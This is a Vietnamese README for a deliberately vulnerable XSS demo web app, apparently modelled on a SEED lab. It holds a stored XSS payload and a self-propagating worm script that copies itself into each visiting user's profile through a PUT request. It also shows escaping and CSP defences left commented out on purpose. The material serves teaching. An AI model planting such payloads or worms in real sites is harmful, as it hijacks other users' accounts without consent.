# Cross-site scripting

Bản trình diễn demo xss

## Cài đặt

Clone dự án về máy của bạn rồi thực hiện chạy dòng lệnh:

```npm
npm install
npm run dev
```

Mở trình duyệt, truy cập vào đường dẫn localhost:8080, truy cập vào một số tài khoản như admin hay joshoangtien, mật khẩu mặc định là 123. Bạn có thể thêm hoặc chỉnh sửa người dùng tại [database/usersData.json](database/usersData.json), trong dự án này mình không sử dụng chức năng đăng ký hay thay đổi mật khẩu vì nó không cần thiết.

Sau khi đăng nhập, bạn có thể thêm tin nhắn mới, chỉnh sửa hồ sơ của mình hoặc xem hồ sơ của người dùng khác bằng cách nhấp vào tên của họ (nơi mình sẽ đặt nội dung XSS).

## Cách hoạt động XSS

Login -> Edit user -> Đặt đoạn mã bên dưới "Introduction" và "Done". Nó sẽ hiển thị cảnh báo khi người dùng truy cập vào hồ sơ của bạn, bạn có thể tùy biến các kiểu tấn công khác không chỉ việc hiển thị cảnh báo kia, ngoài ra bạn có thể chèn mã tấn công vào tin nhắn, đoạn tấn công sẽ thực thi khi có người truy cập vào tin nhắn.

```html
</textarea> <script>alert("hehe");</script>
<!-- Đặt </textarea> ngay trước đoạn script để kết thúc thẻ </textarea>, bạn có thể kiểm tra bằng cách F12. -->
```

Đoạn mã dưới đây thực thi hiển thị cảnh báo khi người dùng truy cập vào hồ sơ của bạn, nhưng nó cũng sao chép toàn bộ script vào "Introduction" của người dùng đấy (Tấn công lây lan).\
Hiện chức năng chưa hoạt động với tin nhắn.

```html
</textarea> 
<script id="worm">
    alert("hehe");  // Hiển thị cảnh báo

    // ----- Đoạn mã self-propagating -----
    var headerTag = '<script id="worm">';
    var ownCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>"; // tách thẻ để ngăn ngừa script kết thúc
    var wormCode = "</textarea>" + headerTag + ownCode + tailTag;
    window.onload = function () {
        var updatedUser = {
            introduction: wormCode
        };

        var xhr = new XMLHttpRequest();
        xhr.open("PUT", "/editUser", true);
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.send(JSON.stringify(updatedUser));
    };
    // ----- Đoạn mã self-propagating -----
</script>
```

***XHR là gì?***: Sử dụng developer tool (bật Preserve log) để xem yêu cầu được gửi đi khi nhấn nút "Done" trong trang editUser. Bạn sẽ thấy một request "editUser" được gửi đến, nếu nó bị hủy, bạn chuột phải vào và Copy -> Copy as fetch và Paste nó vào đâu đấy để kiểm tra. Phương thức là PUT và nội dung bao gồm {"introduction":"..."}, vì vậy mình sẽ tạo XHR tương tự để gửi tới server. Điều hiển nhiên là mình sẽ thấy nội dung trên server, nhưng với góc độ của hacker (người không nắm giữ mã nguồn) thì lại có thể thấy.

## Phòng ngừa

### **Đóng nội dung động**

Truy cập [controllers/userController.js line 40](controllers/userController.js#L40)  (editUser PUT request):

```javascript
var newIntroduction = req.body.introduction;
// newIntroduction = newIntroduction.replace(/&/g, "&amp;");
// newIntroduction = newIntroduction.replace(/</g, "&lt;");
// newIntroduction = newIntroduction.replace(/>/g, "&gt;");
// newIntroduction = newIntroduction.replace(/"/g, "&quot;");
// newIntroduction = newIntroduction.replace(/'/g, "&#039;");
```

Comment lại 5 dòng code, nó sẽ loại bỏ {&, <, >, ", '} cho tới việc mã hóa {&amp, &lt, &gt, &quot, &#039} trong nội dung đã nhận. Bằng cách này, mọi cách thức tấn công script sẽ bị vô hiệu hóa.

### **Content Security Policy**

[Content Securiy Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy) là giải pháp tiêu chuẩn cho nhiều vấn đề bảo mật web. Nó hạn chế những gì có thể được thực thi, được thực hiện trong một trang web để các mã độc hại gặp khó khăn hơn trong việc thực hiện bất cứ điều gì.

Truy cập [controllers/userController.js line 17](controllers/userController.js#L17) và [line 68](controllers/userController.js#L68):

```javascript
res.writeHead(200, {
    "Content-Type": "text/html",
    //"Content-security-policy": "default-src 'self'",
});
```

Comment dòng Content-securiy-policy, để ngăn Content Securiy Policy trước khi request header.

Hoặc truy cập [resources/editUser.html line 9](resources/editUser.html#L9) và [resources/viewUser.html line 9](resources/viewUser.html#L9):

```html
<!-- <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> -->
```

Comment dòng meta

Trùy chọn CSP là:

```CSP
Content-security-policy: default-src 'self'
```

[`default-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) có nghĩa là với mọi `src` khi khôn xuất hiện,nó sẽ sử dụng mặc định giá trị này [`script-src`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)).\
[`self`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/Sources#sources) có nghĩa là các trang web chỉ có thể sử dụng các tài nguyên đến từ máy chủ của chính nó.

## Reference

Web Security for Developers: Real Threats, Practical Defense\
<https://seedsecuritylabs.org/Labs_20.04/Web/Web_XSS_Elgg/>
